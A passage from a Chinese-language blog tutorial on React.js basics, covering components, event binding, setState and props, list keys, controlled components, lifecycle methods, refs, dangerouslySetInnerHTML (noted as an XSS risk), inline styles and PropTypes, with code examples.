class="code"><pre><div class="line">import React, &#123; Component &#125; from &apos;react&apos;;</div><div class="line">import ReactDOM from &apos;react-dom&apos;;</div><div class="line"></div><div class="line">class Title extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;h1&gt;hello react&lt;/h1&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Header extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;Title /&gt; //header里面包含Title</div><div class="line">      &lt;h2&gt;This is Header&lt;/h2&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Main extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;h2&gt;This is main content&lt;/h2&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Footer extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;h2&gt;This is footer&lt;/h2&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Index extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt; //多标签并列放置，组成页面</div><div class="line">        &lt;Header /&gt;</div><div class="line">        &lt;Main /&gt;</div><div class="line">        &lt;Footer /&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ReactDOM.render(</div><div class="line">  &lt;Index /&gt;,</div><div class="line">  document.getElementById(&apos;root&apos;)</div><div class="line">)</div></pre></td></tr></table></figure>
-<h1 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h1><p> React.js 不需要手动调用浏览器原生的 addEventListener 进行事件监听。<br> React.js 封装好了一系列的 on<em> 的属性，当需要为某个元素监听某个事件的时候，只需要简单地给它加上 on</em> 就可以了。<br> 而且不需要考虑不同浏览器兼容性的问题，React.js 都封装好了这些细节。</p>
-<p> 但是要注意，没有经过特殊处理的话，这些 on* 的事件监听只能用在普通的 HTML 的标签上，而不能用在组件标签上</p>
-<p> React.js 会给每个事件监听传入一个 event 对象，这个对象提供的功能和浏览器提供的功能一致，而且它是兼容所有浏览器的。</p>
-<p> React.js 的事件监听方法需要手动 bind 到当前实例，这种模式在 React.js 中非常常用。不然监听事件调用的方法里面的this是undefined<br> 另外可以在bind 的时候传参</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">class Title extends Component &#123;</div><div class="line"> handleClickOnTitle (e) &#123;</div><div class="line">    console.log(this)//undefined</div><div class="line">    console.log(e.target.innerHTML)//hello React</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;h1 onClick=&#123;this.handleClickOnTitle&#125;&gt;hello React&lt;/h1&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Title extends Component &#123;</div><div class="line"> handleClickOnTitle (word, e) &#123;</div><div class="line">    console.log(this, word)//Title 对象，“hello”</div><div class="line">    console.log(e.target.innerHTML)//hello React</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;h1 onClick=&#123;this.handleClickOnTitle.bind(this, &apos;Hello&apos;)&#125;&gt;hello React &lt;/h1&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h1 id="setState函数和pros"><a href="#setState函数和pros" class="headerlink" title="setState函数和pros"></a>setState函数和pros</h1><p>一个组件的显示形态是可以由它数据状态(state)和配置参数(pros)决定的，即两种方式控制组件显示形态</p>
-<h2 id="方式一：利用state的值-通过渲染控制显示状态"><a href="#方式一：利用state的值-通过渲染控制显示状态" class="headerlink" title="方式一：利用state的值,通过渲染控制显示状态"></a>方式一：利用state的值,通过渲染控制显示状态</h2><p>一个组件可以拥有自己的状态,React.js 的 state 用来存储这种可变化的状态,再让setState函数根据state的值重新渲染组件到页面<br>setState 方法由父类 Component 所提供。当调用这个函数的时候，React.js 会更新组件的状态 state ，并且重新调用 render 方法，然后再把 render 方法所渲染的最新的内容显示到页面上。<br>注意，当要改变组件的状态的时候，不能直接用 this.state = xxx 这种方式来修改，如果这样做 React.js 就没办法知道你修改了组件的状态，它也就没有办法更新页面。所以，一定要使用 React.js 提供的 setState 方法，它接受一个对象或者函数作为参数。</p>
-<p>传入一个对象的时候，这个对象表示该组件的新状态。但只需要传入需要更新的部分就可以了，而不需要传入整个对象<br>要注意的是，当调用 setState 的时候，React.js 并不会马上修改 state。而是把这个对象放到一个更新队列里面，稍后才会从队列当中把新的状态提取出来合并到 state 当中，然后再触发组件更新</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">handleClickOnLikeButton () &#123;</div><div class="line">    console.log(this.state.isLiked)</div><div class="line">    this.setState(&#123;</div><div class="line">      isLiked: !this.state.isLiked</div><div class="line">    &#125;)</div><div class="line">    console.log(this.state.isLiked) //第二次打印的就是第一次打印的值</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
-<p>如果需要多次setState,而且后续传入参数依赖前一个setState 参数，这时就要用函数做setState参数，<br>React.js 会把上一个 setState 的结果传入这个函数，你就可以使用该结果进行运算、操作，然后返回一个对象作为更新 state 的对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">handleClickOnLikeButton () &#123;</div><div class="line"></div><div class="line">    // this.setState(&#123; count: 0 &#125;) // =&gt; this.state.count 还是 undefined</div><div class="line">    // this.setState(&#123; count: this.state.count + 1&#125;) // =&gt; undefined + 1 = NaN</div><div class="line">    // this.setState(&#123; count: this.state.count + 2&#125;) //最终结果为NAN</div><div class="line"></div><div class="line">    this.setState((prevState) =&gt; &#123;</div><div class="line">      return &#123; count: 0 &#125;</div><div class="line">    &#125;)</div><div class="line">    this.setState((prevState) =&gt; &#123;</div><div class="line">      return &#123; count: prevState.count + 1 &#125; // 上一个 setState 的返回是 count 为 0，当前返回 1</div><div class="line">    &#125;)</div><div class="line">    this.setState((prevState) =&gt; &#123;</div><div class="line">      return &#123; count: prevState.count + 2 &#125; // 上一个 setState 的返回是 count 为 1，当前返回 3</div><div class="line">    &#125;)</div><div class="line">    // 最后的结果是 this.state.count 为 3，所以如果JSX中如果显示count,则显示3</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
-<p>多次调用setState只会返回多次运行后的结果，React.js 内部会把 JavaScript 事件循环中的消息队列的同一个消息中的 setState 都进行合并以后再重新渲染组件。</p>
-<h2 id="方式二：在JSX中使用自定义组件时，传入配置属性，根据属性显示状态"><a href="#方式二：在JSX中使用自定义组件时，传入配置属性，根据属性显示状态" class="headerlink" title="方式二：在JSX中使用自定义组件时，传入配置属性，根据属性显示状态"></a>方式二：在JSX中使用自定义组件时，传入配置属性，根据属性显示状态</h2><p>在使用一个组件的时候，可以把参数放在标签的属性当中，所有的属性都会作为 props 对象的键值<br>组件内部就可以通过 this.props 来访问到这些配置参数<br>可以把任何类型的数据作为组件的参数，包括字符串、数字、对象、数组、甚至是函数等等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">class Index extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;LikeButton wordings=&#123;&#123;likedText: &apos;已赞&apos;, unlikedText: &apos;赞&apos;&#125;&#125;</div><div class="line">        onClick=&#123;() =&gt; console.log(&apos;Click on like button!&apos;)/&gt; //这里onclick可以被当做属性访问到</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">//LikeButton 类</div><div class="line">handleClickOnLikeButton () &#123;</div><div class="line"></div><div class="line">    this.setState(&#123;</div><div class="line">      isLiked: !this.state.isLiked</div><div class="line">    &#125;)</div><div class="line">    if (this.props.onClick) &#123; //这里的onclick是使用&lt;LikeButton /&gt;时定义的属性</div><div class="line">      this.props.onClick() //这里的函数通过属性传递进来，不是组件自己实现</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">render()return 的JSX的button onclick事件绑定handleClickOnLikeButton函数</div></pre></td></tr></table></figure></p>
-<p>JSX 的{}内可以嵌入任何表达式,{ {} }就是在 {} 内部用对象}字面量返回一个对象而已,<br>this.props.wordings就是对象{ likedText: ‘已赞’, unlikedText: ‘赞’} </p>
-<p>可以用defaultProps配置默认属性,这样就不需要判断配置属性是否传进来了,如果没有传进来，会直接使用 defaultProps 中的默认属性</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">class LikeButton extends Component &#123;</div><div class="line">  static defaultProps = &#123;</div><div class="line">    likedText: &apos;取消&apos;,</div><div class="line">    unlikedText: &apos;点赞&apos;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  constructor () &#123;</div><div class="line">    super()</div><div class="line">    this.state = &#123; isLiked: false &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  handleClickOnLikeButton () &#123;</div><div class="line">    this.setState(&#123;</div><div class="line">      isLiked: !this.state.isLiked</div><div class="line">    &#125;)</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">  //不需要在这里向下面这样判断是否传进来了配置属性,如果配置了wordings就用wordings，否则用后面&#123;&#125;内的默认值</div><div class="line">  &lt;!-- const wordings = this.props.wordings || &#123;</div><div class="line">      likedText: &apos;取消&apos;,</div><div class="line">      unlikedText: &apos;点赞&apos;</div><div class="line">    &#125; --&gt;</div><div class="line">    return (</div><div class="line">      &lt;button onClick=&#123;this.handleClickOnLikeButton.bind(this)&#125;&gt;</div><div class="line">        &#123;this.state.isLiked</div><div class="line">          ? this.props.likedText //直接使用</div><div class="line">          : this.props.unlikedText&#125; 👍</div><div class="line">      &lt;/button&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>一个组件在输入确定的 props 的时候，能够输出确定的 UI 显示形态。如果想修改props决定的显示形态，可以主动通过重新渲染的方式，<br>把新的props传入到组件当中，这样这个组件中由 props 决定的显示形态也会得到相应的改变。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">class Index extends Component &#123;</div><div class="line">  constructor () &#123;</div><div class="line">    super()</div><div class="line">    this.state = &#123;</div><div class="line">      likedText: &apos;已赞&apos;,</div><div class="line">      unlikedText: &apos;赞&apos;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  handleClickOnChange () &#123;</div><div class="line">    this.setState(&#123;</div><div class="line">      likedText: &apos;取消&apos;,</div><div class="line">      unlikedText: &apos;点赞&apos;</div><div class="line">    &#125;)</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;LikeButton</div><div class="line">          likedText=&#123;this.state.likedText&#125;</div><div class="line">          unlikedText=&#123;this.state.unlikedText&#125; /&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">          &lt;button onClick=&#123;this.handleClickOnChange.bind(this)&#125;&gt;</div><div class="line">            修改 wordings</div><div class="line">          &lt;/button&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>即props 一旦传入,你就不可以在组件内部对它进行修改，但是可以通过父组件主动重新渲染的方式来传入新的 props，从而达到更新的效果</p>
-<p>小结<br>state 是让组件控制自己的状态，props 是让外部对组件自己进行配置。<br>没有 state 的组件叫无状态组件（stateless component），设置了 state 的叫做有状态组件（stateful component）<br>因为状态会带来管理的复杂性，所以尽量多地写无状态组件，尽量少地写有状态的组件。这样会降低代码维护的难度，也会在一定程度上增强组件的可复用性。</p>
-<h1 id="函数式组件"><a href="#函数式组件" class="headerlink" title="函数式组件"></a>函数式组件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">//普通写法</div><div class="line">class HelloWorld extends Component &#123;</div><div class="line">  constructor() &#123;</div><div class="line">    super()</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  sayHi () &#123;</div><div class="line">    alert(&apos;Hello World&apos;)</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div onClick=&#123;this.sayHi.bind(this)&#125;&gt;Hello World&lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//函数式组件的编写方式</div><div class="line">const HelloWorld = (props) =&gt; &#123;</div><div class="line">  const sayHi = (event) =&gt; alert(&apos;Hello World&apos;)</div><div class="line">  return (</div><div class="line">    &lt;div onClick=&#123;sayHi&#125;&gt;Hello World&lt;/div&gt;</div><div class="line">  )</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>以前一个组件是通过继承 Component 来构建，一个子类就是一个组件。而用函数式的组件编写方式是一个函数就是一个组件，但使用方法同普通写法<br>函数式组件只能接受 props 而无法像跟类组件一样可以在 constructor 里面初始化 state。你可以理解函数式组件就是一种只能接受 props 和提供 render 方法的类组件。</p>
-<h1 id="渲染列表数据"><a href="#渲染列表数据" class="headerlink" title="渲染列表数据"></a>渲染列表数据</h1><p>如果往 {} 放一个数组，React.js 会帮你把数组里面一个个元素罗列并且渲染出来，如果数组每一项是JSX，就可以将数据渲染到html里面了<br>所以react渲染列表的思路就是,将数组数据利用es6的map方法转换成JSX,再将JSX数组放到render()返回值中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">class Index extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &#123;users.map((user) =&gt; &#123;</div><div class="line">          return (</div><div class="line">            &lt;div&gt;</div><div class="line">              &lt;div&gt;姓名：&#123;user.username&#125;&lt;/div&gt;</div><div class="line">              &lt;div&gt;年龄：&#123;user.age&#125;&lt;/div&gt;</div><div class="line">              &lt;div&gt;性别：&#123;user.gender&#125;&lt;/div&gt;</div><div class="line">              &lt;hr /&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">          )</div><div class="line">        &#125;)&#125;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>进一步优化,将数组每项JSX抽离成自定义组件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">const users = [</div><div class="line">  &#123; username: &apos;Jerry&apos;, age: 21, gender: &apos;male&apos; &#125;,</div><div class="line">  &#123; username: &apos;Tomy&apos;, age: 22, gender: &apos;male&apos; &#125;,</div><div class="line">  &#123; username: &apos;Lily&apos;, age: 19, gender: &apos;female&apos; &#125;,</div><div class="line">  &#123; username: &apos;Lucy&apos;, age: 20, gender: &apos;female&apos; &#125;</div><div class="line">]</div><div class="line"></div><div class="line">class User extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    const &#123; user &#125; = this.props</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;div&gt;姓名：&#123;user.username&#125;&lt;/div&gt;</div><div class="line">        &lt;div&gt;年龄：&#123;user.age&#125;&lt;/div&gt;</div><div class="line">        &lt;div&gt;性别：&#123;user.gender&#125;&lt;/div&gt;</div><div class="line">        &lt;hr /&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Index extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &#123;users.map((user) =&gt; &lt;User user=&#123;user&#125; /&gt;)&#125;</div><div class="line">        &lt;!-- &#123;users.map((user, i) =&gt; &lt;User key=&#123;i&#125; user=&#123;user&#125; /&gt;)&#125; --&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ReactDOM.render(</div><div class="line">  &lt;Index /&gt;,</div><div class="line">  document.getElementById(&apos;root&apos;)</div><div class="line">)</div></pre></td></tr></table></figure></p>
-<p>但是要注意<br>对于用表达式套数组罗列到页面上的元素，都要为每个元素加上 key 属性，这个 key 必须是每个元素唯一的标识<br>这里用循环计数器 i 作为 key对循环标签User添加key,就不会报需要key的错了<br>{users.map((user) =&gt; <user user="\{user\}">)} 变成 {users.map((user, i) =&gt; <user key="\{i\}" user="\{user\}">)}</user></user></p>
-<h1 id="受控组件"><a href="#受控组件" class="headerlink" title="受控组件"></a>受控组件</h1><p>类似于 &lt;input /&gt;、&lt;select /&gt;、&lt;textarea&gt; 这些元素的 value 值被 React.js 所控制、渲染的组件，在 React.js 当中被称为受控组件（Controlled Component）。对于用户可输入的控件，一般都可以让它们成为受控组件.<br>React.js 认为所有的状态都应该由 React.js 的 state 控制，只要类似于 &lt;input /&gt;、&lt;textarea /&gt;、&lt;select /&gt; 这样的输入控件被设置了 value 值，那么它们的值等于state的一个属性值，就会永远以被设置的值为准。值不变，value 就不会变化。<br>在 React.js 当中必须要用 setState 才能更新组件的内容,所以可以通过给输入框绑定监听输入框的 onChange 事件，然后获取到用户输入的内容，再通过 setState 的方式更新 state 中的 value属性绑定的值，这样 输入框的内容才会更新。</p>
-<p>子组件可以利用props向父组件传递数据，即，父组件在使用子组件时，添加属性A，并将该A属性值赋值为一个父组件的函数B，<br>子组件在触发数据提交的时候，检查自己的props有没有属性A,如果有的话，将数据以参数的形式，传递给属性A，即<br>this.props.A({key1:value1,key2”value2….})<br>父组件函数B通过函数参数就可以获得传递过来的数据</p>
-<p>子组件从父组件获取数据，同样使用props,也就是说，父组件在使用子组件的时候把自己的state的一个属性C赋值给子组件的属性D,<br>子组件通过属性D获取父组件传递过来的数据,在子组件中直接使用props.D的值，但要注意给子组件设置defaultProps，给属性D一个默认值，防止出现不传值的情况<br>这种行为叫做“状态提升”<br>如果将属性D的值，再保存到子组件的state中在使用，那么当其他组件也需要这份数据的时候，将无法使用，因为根本没办法访问,因此采用使用props值的办法，将这种组件之间共享的状态交给组件最近的公共父节点保管，然后通过 props 把状态传递给子组件，这样就可以在组件之间共享数据了</p>
-<p>当某个状态被多个组件依赖或者影响的时候，就把该状态提升到这些组件的最近公共父组件中去管理，用 props 传递数据或者函数来管理这种依赖或着影响的行为。<br>对于不会被多个组件依赖和影响的状态（例如某种下拉菜单的展开和收起状态），一般来说只需要保存在组件内部即可，不需要做提升或者特殊的管理。</p>
-<h1 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h1><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><p>React.js 将组件渲染，并且构造 DOM 元素然后塞入页面的过程称为组件的挂载<br>挂载过程:<br>-&gt; constructor() //自身的状态的初始化工作<br>-&gt; componentWillMount()//组件还没挂载完成时进行的组件启动工作，例如 Ajax 数据拉取、定时器的启动。<br>-&gt; render()<br>// 然后构造 DOM 元素插入页面<br>-&gt; componentDidMount() //组件挂载完成以后，也就是 DOM 元素已经插入页面后调用。进行依赖DOM的启动工作<br>// …<br>// 即将从页面中删除, setState 只能在已经挂载或者正在挂载的组件上调用,<br>//组件隐藏的时候，组件的回调函数可能还在不停地尝试 setState,因此会报错<br>-&gt; componentWillUnmount() //组件对应的 DOM 元素从页面中删除之前调用,处理数据清理工作，如定时器的清理<br>// 从页面中删除</p>
-<h2 id="更新阶段"><a href="#更新阶段" class="headerlink" title="更新阶段"></a>更新阶段</h2><p> setState 导致 React.js 重新渲染组件并且把组件的变化应用到 DOM 元素上的过程，这是一个组件的变化过程。而 React.js 也提供了一系列的生命周期函数可以让我们在这个组件更新的过程执行一些操作。<br> 关于更新阶段的组件生命周期：<br>shouldComponentUpdate(nextProps, nextState)：你可以通过这个方法控制组件是否重新渲染。如果返回 false 组件就不会重新渲染。这个生命周期在 React.js 性能优化上非常有用。<br>componentWillReceiveProps(nextProps)：组件从父组件接收到新的 props 之前调用。<br>componentWillUpdate()：组件开始重新渲染之前调用。<br>componentDidUpdate()：组件重新渲染并且把更改变更到真实的 DOM 以后调用。<br><a href="https://reactjs.org/docs/react-component.html" target="_blank" rel="external">官方文档</a></p>
-<h1 id="ref属性"><a href="#ref属性" class="headerlink" title="ref属性"></a>ref属性</h1><p>通过在html标签或自定义的组件标签中添加 ref属性，可以绑定DOM操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">class AutoFocusInput extends Component &#123;</div><div class="line">  componentDidMount () &#123; //利用组件声明周期函数</div><div class="line">    this.input.focus() //这里的this.input就是页面里的DOM元素，因此可以直接使用DOM API</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;input ref=&#123;(input) =&gt; this.input = input&#125; /&gt; //把input标签DOM元素挂到组件的属性input上</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>input 元素加了一个 ref 属性，这个属性值是一个函数,<br>当 input 元素在页面上挂载完成以后，React.js 就会调用这个函数,函数的参数，就是挂载以后的DOM结点<br>在函数中把这个 DOM 元素设置为组件实例的一个属性，这样就可以通过 this.input 获取到这个 DOM 元素。</p>
-<p>但注意,能不用 ref 就不用，因为React.js 本来就可以做到的页面自动更新的操作和事件监听，多余DOM操作，不利于理解和维护</p>
-<h1 id="dangerouslySetHTML"><a href="#dangerouslySetHTML" class="headerlink" title="dangerouslySetHTML"></a>dangerouslySetHTML</h1><p>dangerouslySetInnerHTML 属性可以用于动态渲染HTML结构,即将HTML字符串，在页面中显示时,当做HTML去渲染<br>给 dangerouslySetInnerHTML 传入一个对象，这个对象的 __html 属性值就相当于元素的 innerHTML，这样就可以动态渲染元素的 innerHTML 结构了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">constructor() &#123;</div><div class="line">    super()</div><div class="line">    this.state = &#123;</div><div class="line">      content: &apos;&lt;h1&gt;React.js cool!&lt;/h1&gt;&apos;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div</div><div class="line">        className=&apos;editor-wrapper&apos;</div><div class="line">        dangerouslySetInnerHTML=&#123;&#123;__html: this.state.content&#125;&#125; /&gt;</div><div class="line">    )</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
-<p>因为设置 innerHTML 可能会导致跨站脚本攻击（XSS），所以 React.js 团队认为把事情搞复杂可以防止（警示）大家滥用这个属性。这个属性不必要的情况就不要使用</p>
-<h1 id="style"><a href="#style" class="headerlink" title="style"></a>style</h1><p>在 React.js 中需要把 CSS 属性变成一个对象再传给元素<br>style 接受一个对象，这个对象里面是这个元素的 CSS 属性键值对，原来 CSS 属性中带 - 的元素都必须要去掉 - 换成驼峰命名，如 font-size 换成 fontSize，text-align 换成 textAlign。<br>用对象作为 style 方便动态设置元素的样式。可以用 props 或者 state 中的数据生成样式对象再传给元素，然后用 setState 就可以修改样式，非常灵活</p>
-<p>&lt;h1 style={ {fontSize: ‘12px’, color: this.state.color} }&gt;React.js color&lt;/h1&gt;</p>
-<h1 id="PropTypes-组件参数类型验证"><a href="#PropTypes-组件参数类型验证" class="headerlink" title="PropTypes 组件参数类型验证"></a>PropTypes 组件参数类型验证</h1><p>给组件的配置参数加上类型验证,就可以验证传进组件的参数是否符合预定的数据类型，报错也能定位问题<br>PropTypes就是react第三方库，用于验证参数类型，即验证传入组件的数据的数据类型<br>npm install –save prop-types<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">import React, &#123; Component &#125; from &apos;react&apos;</div><div class="line">import PropTypes from &apos;prop-types&apos;</div><div class="line"></div><div class="line">class Comment extends Component &#123;</div><div class="line">  static propTypes = &#123;</div><div class="line">    comment: PropTypes.object //指定传入comment的类型必须为Object</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    const &#123; comment &#125; = this.props</div><div class="line">    return (</div><div class="line">      &lt;div className=&apos;comment&apos;&gt;</div><div class="line">        &lt;div className=&apos;comment-user&apos;&gt;</div><div class="line">          &lt;span&gt;&#123;comment.username&#125; &lt;/span&gt;：</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;p&gt;&#123;comment.content&#125;&lt;/p&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div 